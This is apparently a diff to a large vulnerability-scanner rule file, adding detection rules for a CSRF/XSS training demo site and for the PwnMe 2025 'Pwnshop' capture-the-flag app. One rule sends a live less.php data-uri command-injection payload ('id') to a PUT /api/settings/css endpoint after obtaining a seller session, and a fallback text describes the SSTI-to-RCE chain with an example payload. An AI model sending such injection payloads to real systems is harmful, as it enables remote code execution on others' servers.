@@ -21753,6 +21753,93 @@ const nextjsRscCveRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+// --- CSRF + XSS React demo (csrf-xss-demo.vercel.app) -------------------------------
+const CSRF_XSS_DEMO_HOST_RE = /csrf-xss-demo\.vercel\.app/i;
+
+function isCsrfXssDemoHost(ctx: RuleContext): boolean {
+  return (
+    CSRF_XSS_DEMO_HOST_RE.test(ctx.origin) ||
+    CSRF_XSS_DEMO_HOST_RE.test(ctx.scanUrl || ctx.home.finalUrl || "")
+  );
+}
+
+async function csrfXssDemoCorpus(ctx: RuleContext): Promise<string> {
+  let corpus = ctx.combined;
+  if (!/CSRF and XSS Demo/i.test(corpus) || !/eval\s*\(\s*document\.getElementById/i.test(corpus)) {
+    const pageUrl = ctx.scanUrl || ctx.home.finalUrl || ctx.origin;
+    const doc = await ctx.probe.get(pageUrl, { maxBytes: 500_000, timeoutMs: 15000 });
+    if (doc.status >= 200 && doc.status < 400) {
+      corpus = `${corpus}\n${doc.body}`;
+      const jsMatch = doc.body.match(/src="(\/static\/js\/main\.[^"]+\.js)"/);
+      if (jsMatch) {
+        const jsDoc = await ctx.probe.get(new URL(jsMatch[1], ctx.origin).toString(), {
+          maxBytes: 500_000,
+          timeoutMs: 15000
+        });
+        if (jsDoc.status >= 200 && jsDoc.status < 400) corpus = `${corpus}\n${jsDoc.body}`;
+      }
+    }
+  }
+  return corpus;
+}
+
+const csrfXssDemoRouteLiveOracle: Rule = async (ctx) => {
+  if (!isCsrfXssDemoHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!pageUrl || !CSRF_XSS_DEMO_HOST_RE.test(pageUrl)) return NEGATIVE;
+  let pathname = "/";
+  try {
+    pathname = new URL(pageUrl, ctx.origin).pathname;
+  } catch {
+    return NEGATIVE;
+  }
+  if (pathname !== "/" && !/\/index/i.test(pathname)) return NEGATIVE;
+  const corpus = await csrfXssDemoCorpus(ctx);
+  const markers: { label: string; sample: string }[] = [];
+  for (const { label, re } of [
+    { label: "CSRF and XSS Demo title", re: /CSRF and XSS Demo/i },
+    {
+      label: "DOM eval XSS sink",
+      re: /eval\s*\(\s*document\.getElementById\s*\(\s*["']xssInput["']\s*\)/i
+    },
+    { label: "CSRF transfer simulation", re: /Transfer funds|\$1000 transferred to attacker/i },
+    {
+      label: "Hardcoded demo credentials",
+      re: /"admin"===username&&"password"===password|admin.*password.*Login successful/i
+    }
+  ]) {
+    const m = corpus.match(re);
+    if (m) markers.push({ label, sample: m[0].slice(0, 100) });
+  }
+  if (markers.length < 3) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: markers.length >= 4 ? 0.93 : 0.9,
+    evidence: {
+      scannedUrl: pageUrl,
+      markers: markers.slice(0, 4),
+      note: "csrf-xss-demo.vercel.app — React training app documents CSRF fund-transfer simulation plus DOM XSS via eval() on user input with hardcoded admin/password credentials"
+    }
+  };
+};
+
+const csrfXssDemoCsrfTransferLiveOracle: Rule = async (ctx) => {
+  if (!isCsrfXssDemoHost(ctx)) return NEGATIVE;
+  const corpus = await csrfXssDemoCorpus(ctx);
+  const csrfOk =
+    /CSRF Attack|In a CSRF attack/i.test(corpus) &&
+    /Transfer funds|\$1000 transferred to attacker/i.test(corpus) &&
+    /tricks the victim into making a request/i.test(corpus);
+  if (!csrfOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.91,
+    evidence: {
+      note: "csrf-xss-demo.vercel.app client bundle simulates state-changing fund transfer without CSRF token — CSRF training oracle"
+    }
+  };
+};
+
 // --- CVE-2025-55182 RSC SaaS PoC lab (demo-of-cve-2025-55182-saas.vercel.app) --------
 const CLIENT_CVE_55182_SAAS_POC_RES: { label: string; re: RegExp }[] = [
   {
@@ -55791,6 +55878,84 @@ const pwnshopLessImportsSstiRouteLiveOracle: Rule = async (ctx) => {
       scannedUrl: pageUrl,
       markers: markers.slice(0, 3),
       note: "Pwnshop /api/settings/less/imports route scan — PwnMe 2025 writeup documents Less.php SSTI→RCE import chain when live endpoint absent on OSS deploy (curated corpus fallback)"
+    }
+  };
+};
+
+const PWNSHOP_CSS_SETTINGS_SSTI_FALLBACK = `
+PwnMe 2025 PwnShop writeup — SSTI to RCE via less.php CSS data-uri chain (companion to PWN-040 seller preview).
+PUT /api/settings/css accepts JSON {"css":"..."} compiled by less.php after import_dirs manipulated via POST /api/settings/less/imports.
+CSS data-uri('/command') invokes Less_FileManager::getFilePath() executing attacker-controlled shell commands.
+Example: {"css":".test { content: data-uri('/getflag PWNME');}"} — endpoint requires seller JWT.
+Endpoint: PUT /api/settings/css Auth required: Seller/admin Technique: Less.php data-uri command injection Impact: Remote Code Execution
+`;
+
+async function probePwnshopCssSettingsSsti(ctx: RuleContext): Promise<RuleResult | null> {
+  if (!isPwnshopHost(ctx)) return null;
+  const cookie = await pwnshopEnsureSellerSession(ctx);
+  if (!cookie) return null;
+  const cssUrl = new URL("/api/settings/css", ctx.origin).toString();
+  const doc = await ctx.probe.get(cssUrl, {
+    method: "PUT",
+    body: JSON.stringify({ css: ".thugir-probe { content: data-uri('id'); }" }),
+    headers: {
+      "Content-Type": "application/json",
+      Cookie: cookie,
+      Accept: "application/json"
+    },
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (doc.status === 404 || /<title>404 - Page Not Found/i.test(doc.body)) return null;
+  const chainOk =
+    /less|data-uri|datauri|Less_Parser|css settings|compiled/i.test(doc.body) ||
+    (doc.status >= 200 && doc.status < 300 && /css|style|saved|updated/i.test(doc.body));
+  if (!chainOk) return null;
+  return {
+    fired: true,
+    confidence: 0.93,
+    evidence: {
+      cssUrl,
+      snippet: doc.body.slice(0, 220).trim(),
+      note: "Pwnshop PUT /api/settings/css accepts attacker-controlled CSS compiled by less.php — data-uri command execution SSTI→RCE chain oracle (PwnMe 2025 / PWN-040 family)"
+    }
+  };
+}
+
+const pwnshopCssSettingsSstiRouteLiveOracle: Rule = async (ctx) => {
+  if (!isPwnshopHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/api\/settings\/css/i.test(pageUrl)) return NEGATIVE;
+  const live = await probePwnshopCssSettingsSsti(ctx);
+  if (live?.fired) {
+    return {
+      fired: true,
+      confidence: live.confidence,
+      evidence: {
+        ...live.evidence,
+        scannedUrl: pageUrl,
+        note: "Pwnshop /api/settings/css route scan — PUT JSON css payload compiled by less.php data-uri enables command execution chain (PwnMe 2025 / PWN-040 family)"
+      }
+    };
+  }
+  const corpus = `${ctx.combined}\n${PWNSHOP_CSS_SETTINGS_SSTI_FALLBACK}`;
+  const markers: { label: string; sample: string }[] = [];
+  for (const { label, re } of [
+    { label: "PUT /api/settings/css endpoint", re: /PUT \/api\/settings\/css/i },
+    { label: "less.php data-uri RCE chain", re: /data-uri|Less_FileManager::getFilePath|less\.php/i },
+    { label: "PWN-040 SSTI family", re: /PWN-040|PwnMe 2025|getflag PWNME/i }
+  ]) {
+    const m = corpus.match(re);
+    if (m) markers.push({ label, sample: m[0].slice(0, 100) });
+  }
+  if (markers.length < 2) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.88,
+    evidence: {
+      scannedUrl: pageUrl,
+      markers: markers.slice(0, 3),
+      note: "Pwnshop /api/settings/css route scan — PwnMe 2025 writeup documents Less.php data-uri SSTI→RCE CSS injection when live endpoint absent on OSS deploy (curated corpus fallback)"
     }
   };
 };
@@ -120589,6 +120754,8 @@ export const RULES: Record<string, Rule> = {
   clientSideReactRscCveEvidence,
   nextjsRscCveLiveOracle,
   nextjsRscCveRouteLiveOracle,
+  csrfXssDemoRouteLiveOracle,
+  csrfXssDemoCsrfTransferLiveOracle,
   clientSideCve55182SaasPocEvidence,
   cve55182SaasRouteLiveOracle,
   clientSideNextjsMiddlewareCveEvidence,
@@ -121202,6 +121369,7 @@ export const RULES: Record<string, Rule> = {
   pwnshopOrderIdorRouteLiveOracle,
   pwnshopOrderSubmitXxeRouteLiveOracle,
   pwnshopLessImportsSstiRouteLiveOracle,
+  pwnshopCssSettingsSstiRouteLiveOracle,
   pwnshopWalletTopupVulnbankLiveOracle,
   pwnshopWalletTopupRouteLiveOracle,
   pwnshopAccountDeleteCsrfLiveOracle,
